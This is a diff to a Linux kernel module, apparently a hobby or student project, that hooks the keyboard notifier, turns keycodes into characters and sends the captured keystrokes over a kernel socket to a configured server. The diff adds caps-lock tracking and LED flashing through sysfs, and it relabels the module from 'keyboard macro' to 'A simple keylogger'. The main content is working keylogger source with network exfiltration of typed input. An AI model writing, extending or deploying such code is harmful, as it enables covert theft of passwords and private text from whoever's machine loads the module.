@@ -1,20 +1,25 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/slab.h>
 #include <linux/init.h>
+#include <linux/sched.h>
 #include <linux/input.h>
 #include <linux/hid.h>
 #include <linux/keyboard.h>
-#include <linux/uaccess.h>
 #include <linux/socket.h>
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/inet.h>
 #include <linux/bitmap.h>
+#include <linux/delay.h>
 
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 5000
 #define BUFFER_SIZE 256
 #define MAX_KEYCODE 255
+#define CAPSLOCK_BRIGHTNESS_PATH "/sys/class/leds/input4::capslock/brightness" //change for your path
 
 static DECLARE_BITMAP(key_states, MAX_KEYCODE + 1);
 
@@ -47,26 +52,7 @@ static int message_len = 0;
 static struct socket *sock;
 static struct sockaddr_in s_addr;
 short shift_pressed = 0;
-
-// static short get_capslock_state(void)
-// {
-//     struct input_dev *keyboard_dev;
-//     short caps_state = 0;
-
-//     // Pobierz urządzenie klawiatury
-//     keyboard_dev = input_get_device();
-//     if (!keyboard_dev) {
-//         pr_err("Can't find the device\n");
-//         return -1;
-//     }
-
-//     caps_state = test_bit(LED_CAPSL, keyboard_dev->led);
-
-//     // Free device
-//     input_put_device(keyboard_dev);
-
-//     return caps_state;
-//}
+short capslock_state = 0;
 
 // Function to send data to the server
 static int send_data_to_server(const char *data)
@@ -87,6 +73,48 @@ static int send_data_to_server(const char *data)
     return ret;
 }
 
+static void led_lights_flashing(void)
+{
+    struct file *file;
+    loff_t pos = 0;
+    char *buffer = "1";
+    char *reset_buffer = "0";
+    ssize_t bytes_written;
+    for(int i = 0; i < 10; i++){
+
+        // Open the file in write-only mode
+        file = filp_open(CAPSLOCK_BRIGHTNESS_PATH, O_WRONLY, 0);
+        if (IS_ERR(file)) {
+            pr_err("Failed to open file for writing: %ld\n", PTR_ERR(file));
+            return;
+        }
+
+        // Write "1" to the file
+        bytes_written = kernel_write(file, buffer, 1, &pos);
+        if (bytes_written < 0) {
+            pr_err("Failed to write '1' to file: %ld\n", bytes_written);
+        } else {
+            pr_info("Successfully wrote '1' to file\n");
+        }
+        msleep(200);
+
+        // Reset position for the next write
+        pos = 0;
+
+        // Write "0" to the file
+        bytes_written = kernel_write(file, reset_buffer, 1, &pos);
+        if (bytes_written < 0) {
+            pr_err("Failed to write '0' to file: %ld\n", bytes_written);
+        } else {
+            pr_info("Successfully wrote '0' to file\n");
+        }
+        msleep(200);
+    
+        // Clean up
+        filp_close(file, NULL);
+    }
+}
+
 static int keyboard_event(struct notifier_block *nb, unsigned long code, void *param)
 {
     struct keyboard_notifier_param *kp = param;
@@ -94,6 +122,19 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
     if (kp->value == KEY_LEFTSHIFT || kp->value == KEY_RIGHTSHIFT) {
         shift_pressed = kp->down;  // Update shift state when the key is pressed or released
     }
+    if(kp->value == KEY_CAPSLOCK){
+        if (kp->down) {
+        capslock_state = !capslock_state;  // Toggle on key press
+        pr_info("Caps state: %d\n", capslock_state);
+        }
+    }
+
+    if(kp->value == KEY_F1)
+    {
+        if (kp->down)
+            led_lights_flashing();
+    }
+    
     
     if (kp->down && kp->value >= 0 && kp->value <= MAX_KEYCODE) {
         const char *key_char = keymap[kp->value];
@@ -107,7 +148,7 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
             }
 
             char display_char = key_char[0];
-            if (shift_pressed && display_char >= 'a' && display_char <= 'z') {
+            if ((shift_pressed || capslock_state) && display_char >= 'a' && display_char <= 'z') {
                 display_char = display_char - 'a' + 'A';  // Convert to uppercase
                 snprintf(message + message_len, BUFFER_SIZE - message_len, " %c", display_char); // Append character
             
@@ -121,6 +162,49 @@ static int keyboard_event(struct notifier_block *nb, unsigned long code, void *p
     }
 
     return NOTIFY_OK;
+}
+
+static void get_capslock_state(void) {
+    struct file *file;
+    char *buffer;
+    ssize_t bytes_read;
+
+    // Allocate memory for buffer (2 bytes to store 1 character + null terminator)
+    buffer = kmalloc(2, GFP_KERNEL);
+    if (!buffer) {
+        pr_err("Failed to allocate memory\n");
+        return;
+    }
+
+    // Open the file in read-only mode
+    file = filp_open(CAPSLOCK_BRIGHTNESS_PATH, O_RDONLY, 0);
+    if (IS_ERR(file)) {
+        pr_err("Failed to open file: %ld\n", PTR_ERR(file));
+        kfree(buffer);
+        return;
+    }
+
+    // Read one byte from the file
+    bytes_read = kernel_read(file, buffer, 1, &file->f_pos);
+    if (bytes_read < 0) {
+        pr_err("Failed to read from file\n");
+    } else {
+        buffer[bytes_read] = '\0';  // Null-terminate the string
+        pr_info("Read value from file: %s\n", buffer);
+
+        if (buffer[0] == '1') {
+            capslock_state = 1;  //ON
+        } else if (buffer[0] == '0') {
+            capslock_state = 0;  //OFF
+        } else {
+            pr_err("Invalid value read from file: %s\n", buffer);
+            capslock_state = -1;  //error
+        }
+    }
+
+    // Clean up
+    filp_close(file, NULL);
+    kfree(buffer);
 }
 
 
@@ -160,7 +244,10 @@ static int __init keyboard_macro_init(void)
         return ret;
     }
 
-    pr_info("Keyboard macro module loaded\n");
+    get_capslock_state();
+    led_lights_flashing();
+
+    pr_info("Keyboard module loaded\n");
     return 0;
 }
 
@@ -171,11 +258,11 @@ static void __exit keyboard_macro_exit(void)
         sock_release(sock);
 
     memset(message, 0, BUFFER_SIZE);
-    pr_info("Keyboard macro module unloaded\n");
+    pr_info("Keyboard module unloaded\n");
 }
 
 module_init(keyboard_macro_init);
 module_exit(keyboard_macro_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("A simple keyboard macro module");
+MODULE_DESCRIPTION("A simple keylogger");
